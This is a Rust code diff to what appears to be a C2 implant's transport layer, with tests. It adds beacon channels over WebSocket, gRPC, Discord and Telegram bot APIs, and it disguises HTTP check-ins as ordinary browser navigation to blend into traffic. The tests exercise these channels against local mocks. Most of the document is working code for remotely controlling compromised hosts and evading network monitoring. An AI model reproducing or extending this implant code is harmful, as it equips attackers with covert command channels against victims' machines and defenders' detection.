@@ -22,6 +22,14 @@ pub enum Transport {
     Http {
         client: Client,
         base: String,
+        /// Resolved once at construction: reads `NW_*` once, not per request.
+        web: crate::malleable::WebProfile,
+    },
+    /// Persistent WebSocket carrying the same sealed-envelope protocol as the
+    /// HTTP check-in, on `/c2/ws`.
+    Ws {
+        url: String,
+        stream: Arc<tokio::sync::Mutex<Option<WsStream>>>,
     },
     Tcp {
         host: String,
@@ -41,6 +49,29 @@ pub enum Transport {
         share: String,
         resource: String,
     },
+    /// gRPC unary carrier: one `Checkin` call per beacon, carrying the same
+    /// sealed envelope as every other transport. The channel is established
+    /// once and reused; a failed call drops it so the next beacon reconnects.
+    Grpc {
+        endpoint: String,
+        client: Arc<tokio::sync::Mutex<Option<crate::grpc_client::SharedClient>>>,
+    },
+    /// Discord channel: post the frame, poll the channel for the reply.
+    Discord {
+        client: Client,
+        token: String,
+        channel: String,
+        api: String,
+        cursor: Arc<crate::chat::Cursor>,
+    },
+    /// Telegram chat: post the frame, poll updates for the reply.
+    Telegram {
+        client: Client,
+        token: String,
+        chat_id: String,
+        api: String,
+        cursor: Arc<crate::chat::Cursor>,
+    },
 }
 
 impl Transport {
@@ -57,6 +88,7 @@ impl Transport {
             "http" | "https" => Ok(Transport::Http {
                 client: Client::new(),
                 base: endpoint.trim_end_matches('/').to_owned(),
+                web: crate::malleable::WebProfile::for_endpoint(endpoint),
             }),
             "tcp" => {
                 let host = rest
@@ -100,6 +132,26 @@ impl Transport {
                     forward: Arc::new(GSocketForward::new(config)),
                 })
             }
+            "ws" | "wss" => {
+                let base = endpoint.trim_end_matches('/').to_owned();
+                let path = if base.ends_with("/c2/ws") {
+                    base.clone()
+                } else {
+                    format!("{base}/c2/ws")
+                };
+                Ok(Transport::Ws {
+                    url: path,
+                    stream: Arc::new(tokio::sync::Mutex::new(None)),
+                })
+            }
+            "grpc" | "grpcs" => Ok(Transport::Grpc {
+                // tonic wants a URI scheme it understands; the C2 scheme is
+                // rewritten to http/https so TLS can still be requested.
+                endpoint: endpoint
+                    .replace("grpc://", "http://")
+                    .replace("grpcs://", "https://"),
+                client: Arc::new(tokio::sync::Mutex::new(None)),
+            }),
             "dns" => {
                 let (host, port) = rest
                     .rsplit_once(':')
@@ -108,6 +160,38 @@ impl Transport {
                 Ok(Transport::Dns { host, port })
             }
             "smb" => Self::parse_smb(rest),
+            "discord" => {
+                let (token, channel) = rest.split_once('@').ok_or_else(|| {
+                    "discord endpoint must be discord://<token>@<channel>".to_string()
+                })?;
+                if token.is_empty() || channel.is_empty() {
+                    return Err("discord endpoint needs a token and channel".into());
+                }
+                Ok(Transport::Discord {
+                    client: Client::new(),
+                    token: token.to_owned(),
+                    channel: channel.to_owned(),
+                    api: std::env::var("NW_DISCORD_API")
+                        .unwrap_or_else(|_| "https://discord.com/api/v10".into()),
+                    cursor: Arc::new(crate::chat::Cursor::new()),
+                })
+            }
+            "telegram" => {
+                let (token, chat_id) = rest.split_once('@').ok_or_else(|| {
+                    "telegram endpoint must be telegram://<token>@<chat_id>".to_string()
+                })?;
+                if token.is_empty() || chat_id.is_empty() {
+                    return Err("telegram endpoint needs a token and chat id".into());
+                }
+                Ok(Transport::Telegram {
+                    client: Client::new(),
+                    token: token.to_owned(),
+                    chat_id: chat_id.to_owned(),
+                    api: std::env::var("NW_TELEGRAM_API")
+                        .unwrap_or_else(|_| "https://api.telegram.org".into()),
+                    cursor: Arc::new(crate::chat::Cursor::new()),
+                })
+            }
             other => Err(format!("unsupported protocol scheme {other:?}")),
         }
     }
@@ -138,6 +222,9 @@ impl Transport {
     pub fn describe(&self) -> String {
         match self {
             Transport::Http { base, .. } => base.clone(),
+            Transport::Ws { url, .. } => url.clone(),
+            Transport::Discord { channel, .. } => format!("discord:{channel}"),
+            Transport::Telegram { chat_id, .. } => format!("telegram:{chat_id}"),
             Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
             Transport::GSocket { host, port, .. } => format!("gs://{host}:{port}"),
             Transport::Dns { host, port } => format!("dns://{host}:{port}"),
@@ -148,6 +235,7 @@ impl Transport {
             } => {
                 format!("smb://{host}/{share}/{resource}")
             }
+            Transport::Grpc { endpoint, .. } => endpoint.clone(),
         }
     }
 
@@ -156,9 +244,15 @@ impl Transport {
     /// size file-chunk batches per poll.
     pub fn inner_budget(&self) -> usize {
         match self {
-            Transport::Http { .. } | Transport::Tcp { .. } | Transport::GSocket { .. } => 32 * 1024,
+            Transport::Http { .. }
+            | Transport::Tcp { .. }
+            | Transport::GSocket { .. }
+            | Transport::Ws { .. }
+            | Transport::Grpc { .. } => 32 * 1024,
             Transport::Dns { .. } => 1200,
-            Transport::Smb { .. } => 32 * 1024,
+            Transport::Smb { .. } | Transport::Discord { .. } | Transport::Telegram { .. } => {
+                32 * 1024
+            }
         }
     }
 
@@ -166,7 +260,8 @@ impl Transport {
     /// frame, return its raw (sealed) bytes. No envelope parsing here.
     pub async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
         match self {
-            Transport::Http { client, base } => http_exchange(client, base, sealed).await,
+            Transport::Http { client, base, web } => http_exchange(client, base, web, sealed).await,
+            Transport::Ws { url, stream } => ws_exchange(url, stream, sealed).await,
             Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
             Transport::GSocket {
                 host,
@@ -177,14 +272,35 @@ impl Transport {
                 tcp_exchange(host, *port, sealed).await
             }
             Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
+            Transport::Discord {
+                client,
+                token,
+                channel,
+                api,
+                cursor,
+            } => discord_exchange(client, token, channel, api, cursor, sealed).await,
+            Transport::Telegram {
+                client,
+                token,
+                chat_id,
+                api,
+                cursor,
+            } => telegram_exchange(client, token, chat_id, api, cursor, sealed).await,
             Transport::Smb {
                 host,
                 share,
                 resource,
             } => smb_exchange(host, share, resource, sealed).await,
+            Transport::Grpc { endpoint, client } => {
+                crate::grpc_client::exchange(endpoint, client, sealed).await
+            }
         }
     }
 }
+
+/// One connected WebSocket to the C2 server.
+type WsStream =
+    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;
 
 pub struct GSocketForward {
     executable: PathBuf,
@@ -315,17 +431,193 @@ fn host_for_bind(host: &str) -> &str {
     }
 }
 
-async fn http_exchange(client: &Client, base: &str, sealed: &[u8]) -> Result<Vec<u8>, String> {
+async fn http_exchange(
+    client: &Client,
+    base: &str,
+    web: &crate::malleable::WebProfile,
+    sealed: &[u8],
+) -> Result<Vec<u8>, String> {
     let url = format!("{base}/c2/checkin");
-    let resp = client
-        .post(&url)
-        .body(sealed.to_vec())
-        .send()
-        .await
-        .map_err(|e| e.to_string())?;
+    let request = client.post(&url).body(sealed.to_vec());
+    // Present as an ordinary browser navigation rather than a bare HTTP client.
+    let resp = web.apply(request).send().await.map_err(|e| e.to_string())?;
     let resp = resp.error_for_status().map_err(|e| e.to_string())?;
     let body = resp.bytes().await.map_err(|e| e.to_string())?;
     Ok(body.to_vec())
+}
+
+/// Exchange one sealed frame over a persistent WebSocket.
+///
+/// The socket is opened on first use and reused for every beacon, so the
+/// handshake is paid once per implant rather than once per poll. Any send or
+/// receive failure drops the socket so the next call reconnects.
+async fn ws_exchange(
+    url: &str,
+    stream: &tokio::sync::Mutex<Option<WsStream>>,
+    sealed: &[u8],
+) -> Result<Vec<u8>, String> {
+    use futures_util::{SinkExt, StreamExt};
+    use tokio_tungstenite::tungstenite::Message;
+
+    let mut guard = stream.lock().await;
+    if guard.is_none() {
+        // SECURITY: `url` is operator-configured; the subprotocol is fixed.
+        let request =
+            tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(url)
+                .map_err(|e| format!("ws request {url}: {e}"))?;
+        let (socket, _reply) = tokio_tungstenite::connect_async(request)
+            .await
+            .map_err(|e| format!("ws connect {url}: {e}"))?;
+        *guard = Some(socket);
+    }
+
+    // Move the stream out for the duration of the exchange so a send/receive
+    // failure can drop it (leave the slot `None`) without a second borrow.
+    let mut socket = match guard.take() {
+        Some(socket) => socket,
+        None => return Err("ws stream unavailable".into()),
+    };
+
+    let outcome = async {
+        socket
+            .send(Message::Binary(sealed.to_vec()))
+            .await
+            .map_err(|e| format!("ws send: {e}"))?;
+        loop {
+            match socket.next().await {
+                Some(Ok(Message::Binary(reply))) => return Ok(reply),
+                Some(Ok(_)) => continue,
+                Some(Err(e)) => return Err(format!("ws receive: {e}")),
+                None => return Err("ws closed by peer".into()),
+            }
+        }
+    }
+    .await;
+
+    // Keep the socket for the next beacon only when the exchange succeeded.
+    if outcome.is_ok() {
+        *guard = Some(socket);
+    }
+    outcome
+}
+
+/// Post the frame into a Discord channel, then poll for the reply.
+async fn discord_exchange(
+    client: &Client,
+    token: &str,
+    channel: &str,
+    api: &str,
+    cursor: &crate::chat::Cursor,
+    sealed: &[u8],
+) -> Result<Vec<u8>, String> {
+    let body = serde_json::json!({ "content": crate::chat::encode_frame(sealed) });
+    let posted = client
+        .post(format!("{api}/channels/{channel}/messages"))
+        .header("Authorization", format!("Bot {token}"))
+        .json(&body)
+        .send()
+        .await
+        .map_err(|e| format!("discord post: {e}"))?;
+    let posted = posted
+        .error_for_status()
+        .map_err(|e| format!("discord post: {e}"))?;
+    if let Ok(json) = posted.json::<serde_json::Value>().await
+        && let Some(id) = json.get("id").and_then(|v| v.as_str())
+    {
+        cursor.note_own(id);
+    }
+
+    // Poll for the operator's reply (newest first, as Discord returns).
+    let messages = client
+        .get(format!("{api}/channels/{channel}/messages?limit=20"))
+        .header("Authorization", format!("Bot {token}"))
+        .send()
+        .await
+        .map_err(|e| format!("discord poll: {e}"))?;
+    let messages = messages
+        .error_for_status()
+        .map_err(|e| format!("discord poll: {e}"))?
+        .json::<Vec<serde_json::Value>>()
+        .await
+        .map_err(|e| format!("discord poll json: {e}"))?;
+
+    for message in &messages {
+        let id = message.get("id").and_then(|v| v.as_str()).unwrap_or("");
+        let body = message
+            .get("content")
+            .and_then(|v| v.as_str())
+            .unwrap_or("");
+        if let Some(reply) = cursor.accept(id, body) {
+            return Ok(reply);
+        }
+    }
+    Err("discord: no reply message".into())
+}
+
+/// Post the frame into a Telegram chat, then poll updates for the reply.
+async fn telegram_exchange(
+    client: &Client,
+    token: &str,
+    chat_id: &str,
+    api: &str,
+    cursor: &crate::chat::Cursor,
+    sealed: &[u8],
+) -> Result<Vec<u8>, String> {
+    let body = serde_json::json!({
+        "chat_id": chat_id,
+        "text": crate::chat::encode_frame(sealed),
+    });
+    let posted = client
+        .post(format!("{api}/bot{token}/sendMessage"))
+        .json(&body)
+        .send()
+        .await
+        .map_err(|e| format!("telegram send: {e}"))?;
+    let posted = posted
+        .error_for_status()
+        .map_err(|e| format!("telegram send: {e}"))?;
+    if let Ok(json) = posted.json::<serde_json::Value>().await
+        && let Some(id) = json
+            .get("result")
+            .and_then(|r| r.get("message_id"))
+            .and_then(|v| v.as_i64())
+    {
+        cursor.note_own(id.to_string());
+    }
+
+    let updates = client
+        .get(format!("{api}/bot{token}/getUpdates?timeout=0"))
+        .send()
+        .await
+        .map_err(|e| format!("telegram poll: {e}"))?;
+    let updates = updates
+        .error_for_status()
+        .map_err(|e| format!("telegram poll: {e}"))?
+        .json::<serde_json::Value>()
+        .await
+        .map_err(|e| format!("telegram poll json: {e}"))?;
+
+    let empty = Vec::new();
+    let results = updates
+        .get("result")
+        .and_then(|v| v.as_array())
+        .unwrap_or(&empty);
+    for update in results {
+        let id = update
+            .get("message")
+            .and_then(|m| m.get("message_id"))
+            .and_then(|v| v.as_i64())
+            .unwrap_or(0);
+        let text = update
+            .get("message")
+            .and_then(|m| m.get("text"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("");
+        if let Some(reply) = cursor.accept(&id.to_string(), text) {
+            return Ok(reply);
+        }
+    }
+    Err("telegram: no reply message".into())
 }
 
 async fn tcp_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
@@ -388,19 +680,271 @@ async fn smb_exchange(
     host: &str,
     share: &str,
     _resource: &str,
-    sealed: &[u8],
+    _sealed: &[u8],
 ) -> Result<Vec<u8>, String> {
-    // Try HTTP-over-SMB first (if an HTTP listener is available over SMB),
-    // falling back to a plain HTTP exchange to the host.
-    let http_url = format!("http://{host}/{share}");
-    let client = Client::new();
-    http_exchange(&client, &http_url, sealed).await
+    // Honest failure: the SMB2 named-pipe write path is not implemented. This
+    // previously fell back to a plain HTTP request, which silently sent
+    // plaintext C2 frames to an SMB endpoint — worse than an error because the
+    // operator believed the traffic was tunnelled when it was not.
+    Err(format!(
+        "SMB transport is not implemented (host={host} share={share}); \
+         use tcp://, gs://, ws://, http://, dns://, discord:// or telegram://"
+    ))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
     use nw_profile::config::GSocketConfig;
+
+    /// The beacon must look like browser navigation on the wire, not just in
+    /// the header table. Boots a real listener and inspects what arrived.
+    #[tokio::test]
+    async fn http_exchange_sends_browser_navigation_headers() {
+        use axum::Router;
+        use axum::extract::State;
+        use axum::http::HeaderMap;
+        use axum::routing::post;
+        use std::sync::{Arc, Mutex};
+
+        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));
+
+        async fn capture(
+            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
+            headers: HeaderMap,
+            body: axum::body::Bytes,
+        ) -> &'static str {
+            *seen.lock().unwrap() = Some(headers.clone());
+            // Echo the sealed frame back verbatim.
+            drop(body);
+            "ok"
+        }
+
+        let app = Router::new()
+            .route("/c2/checkin", post(capture))
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        let server = tokio::spawn(async move {
+            axum::serve(listener, app).await.unwrap();
+        });
+
+        let transport = Transport::Http {
+            client: Client::new(),
+            web: crate::malleable::WebProfile::for_endpoint(&base),
+            base: base.clone(),
+        };
+        transport.exchange(b"sealed-frame").await.unwrap();
+        server.abort();
+
+        let headers = seen.lock().unwrap().clone().expect("server saw a request");
+        let get = |name: &str| {
+            headers
+                .get(name)
+                .and_then(|v| v.to_str().ok())
+                .unwrap_or_default()
+                .to_owned()
+        };
+
+        let ua = get("user-agent");
+        assert!(ua.starts_with("Mozilla/5.0"), "unshaped user-agent: {ua:?}");
+        assert_eq!(get("sec-fetch-mode"), "navigate");
+        assert_eq!(get("sec-fetch-dest"), "document");
+        assert!(get("accept").starts_with("text/html"));
+        assert!(!get("sec-ch-ua").is_empty());
+        assert!(!get("accept-language").is_empty());
+    }
+
+    #[tokio::test]
+    async fn plain_profile_sends_a_bare_request() {
+        use axum::Router;
+        use axum::extract::State;
+        use axum::http::HeaderMap;
+        use axum::routing::post;
+        use std::sync::{Arc, Mutex};
+
+        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));
+
+        async fn capture(
+            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
+            headers: HeaderMap,
+        ) -> &'static str {
+            *seen.lock().unwrap() = Some(headers);
+            "ok"
+        }
+
+        let app = Router::new()
+            .route("/c2/checkin", post(capture))
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        let server = tokio::spawn(async move {
+            axum::serve(listener, app).await.unwrap();
+        });
+
+        let transport = Transport::Http {
+            client: Client::new(),
+            web: crate::malleable::WebProfile::unshaped(),
+            base,
+        };
+        transport.exchange(b"sealed-frame").await.unwrap();
+        server.abort();
+
+        let headers = seen.lock().unwrap().clone().expect("server saw a request");
+        assert!(headers.get("user-agent").is_none());
+        assert!(headers.get("sec-fetch-mode").is_none());
+    }
+
+    /// A one-shot mock Discord server: accepts a POST, then serves a GET that
+    /// returns the operator's reply. Verifies auth header, path and base64 body.
+    #[tokio::test]
+    async fn discord_exchange_round_trips_against_a_mock() {
+        use axum::routing::{get, post};
+        use axum::{Json, Router};
+        use std::sync::{Arc, Mutex};
+
+        #[derive(Clone)]
+        struct Seen(Arc<Mutex<Vec<String>>>);
+        async fn post_msg(
+            axum::extract::State(seen): axum::extract::State<Seen>,
+            headers: axum::http::HeaderMap,
+            Json(body): Json<serde_json::Value>,
+        ) -> Json<serde_json::Value> {
+            let auth = headers
+                .get("authorization")
+                .and_then(|v| v.to_str().ok())
+                .unwrap_or("");
+            seen.0.lock().unwrap().push(format!("auth={auth}"));
+            seen.0
+                .lock()
+                .unwrap()
+                .push(body["content"].as_str().unwrap_or("").to_owned());
+            Json(serde_json::json!({ "id": "own-1" }))
+        }
+        async fn get_msgs(
+            axum::extract::State(seen): axum::extract::State<Seen>,
+        ) -> Json<Vec<serde_json::Value>> {
+            let posted = seen.0.lock().unwrap()[1].clone();
+            Json(vec![
+                serde_json::json!({ "id": "own-1", "content": posted }),
+                serde_json::json!({ "id": "reply-2", "content": crate::chat::encode_frame(b"REPLY") }),
+            ])
+        }
+
+        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
+        let app = Router::new()
+            .route("/channels/chan-1/messages", post(post_msg))
+            .route("/channels/chan-1/messages", get(get_msgs))
+            .with_state(seen.clone());
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let api = format!("http://{}", listener.local_addr().unwrap());
+        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let transport = Transport::from_endpoint("discord://tok@chan-1").unwrap();
+        let Transport::Discord {
+            client,
+            token,
+            channel,
+            api: t_api,
+            cursor,
+        } = transport
+        else {
+            panic!("expected discord transport");
+        };
+        // Point the transport at the mock API base.
+        let reply = discord_exchange(&client, &token, &channel, &api, &cursor, b"REQUEST")
+            .await
+            .unwrap();
+        server.abort();
+        let _ = t_api;
+
+        assert_eq!(reply, b"REPLY".to_vec());
+        let log = seen.0.lock().unwrap().clone();
+        assert_eq!(log[0], "auth=Bot tok");
+        assert_eq!(
+            crate::chat::decode_frame(&log[1]).unwrap(),
+            b"REQUEST".to_vec()
+        );
+    }
+
+    #[tokio::test]
+    async fn telegram_exchange_round_trips_against_a_mock() {
+        use axum::routing::get;
+        use axum::{Json, Router};
+        use std::sync::{Arc, Mutex};
+
+        #[derive(Clone)]
+        struct Seen(Arc<Mutex<Vec<String>>>);
+        async fn send(
+            axum::extract::State(seen): axum::extract::State<Seen>,
+            Json(body): Json<serde_json::Value>,
+        ) -> Json<serde_json::Value> {
+            seen.0
+                .lock()
+                .unwrap()
+                .push(body["text"].as_str().unwrap_or("").to_owned());
+            Json(serde_json::json!({ "ok": true, "result": { "message_id": 7 } }))
+        }
+        async fn updates(
+            axum::extract::State(seen): axum::extract::State<Seen>,
+        ) -> Json<serde_json::Value> {
+            let posted = seen.0.lock().unwrap()[0].clone();
+            Json(serde_json::json!({ "ok": true, "result": [
+                { "message": { "message_id": 7, "text": posted } },
+                { "message": { "message_id": 8, "text": crate::chat::encode_frame(b"TGREPLY") } },
+            ]}))
+        }
+
+        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
+        let app = Router::new()
+            .route("/bottok/sendMessage", axum::routing::post(send))
+            .route("/bottok/getUpdates", get(updates))
+            .with_state(seen.clone());
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let api = format!("http://{}", listener.local_addr().unwrap());
+        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let transport = Transport::from_endpoint("telegram://tok@12345").unwrap();
+        let Transport::Telegram {
+            client,
+            token,
+            chat_id,
+            api: _t,
+            cursor,
+        } = transport
+        else {
+            panic!("expected telegram transport");
+        };
+        let reply = telegram_exchange(&client, &token, &chat_id, &api, &cursor, b"REQ")
+            .await
+            .unwrap();
+        server.abort();
+
+        assert_eq!(reply, b"TGREPLY".to_vec());
+        let log = seen.0.lock().unwrap().clone();
+        assert_eq!(crate::chat::decode_frame(&log[0]).unwrap(), b"REQ".to_vec());
+    }
+
+    #[test]
+    fn discord_and_telegram_endpoints_parse() {
+        match Transport::from_endpoint("discord://bot@123").unwrap() {
+            Transport::Discord { token, channel, .. } => {
+                assert_eq!(token, "bot");
+                assert_eq!(channel, "123");
+            }
+            _ => panic!("expected discord"),
+        }
+        match Transport::from_endpoint("telegram://tok@99").unwrap() {
+            Transport::Telegram { token, chat_id, .. } => {
+                assert_eq!(token, "tok");
+                assert_eq!(chat_id, "99");
+            }
+            _ => panic!("expected telegram"),
+        }
+        // Missing @ or empty parts are rejected.
+        assert!(Transport::from_endpoint("discord://botonly").is_err());
+        assert!(Transport::from_endpoint("telegram://@99").is_err());
+    }
 
     #[test]
     fn scheme_selects_transport() {
@@ -506,5 +1050,23 @@ mod tests {
         let f = frame_bytes(&body);
         assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 5);
         assert_eq!(&f[4..], b"hello");
+    }
+
+    #[test]
+    fn grpc_endpoints_rewrite_to_a_tonic_uri() {
+        // `grpcs://` must not be mangled by the `grpc://` rewrite, which is
+        // why the scheme strings are matched with the `://` included.
+        let plain = Transport::from_endpoint("grpc://c2.example:50051").unwrap();
+        let Transport::Grpc { endpoint, .. } = &plain else {
+            panic!("expected grpc transport");
+        };
+        assert_eq!(endpoint, "http://c2.example:50051");
+
+        let tls = Transport::from_endpoint("grpcs://c2.example:50051").unwrap();
+        let Transport::Grpc { endpoint, .. } = &tls else {
+            panic!("expected grpc transport");
+        };
+        assert_eq!(endpoint, "https://c2.example:50051");
+        assert_eq!(plain.describe(), "http://c2.example:50051");
     }
 }
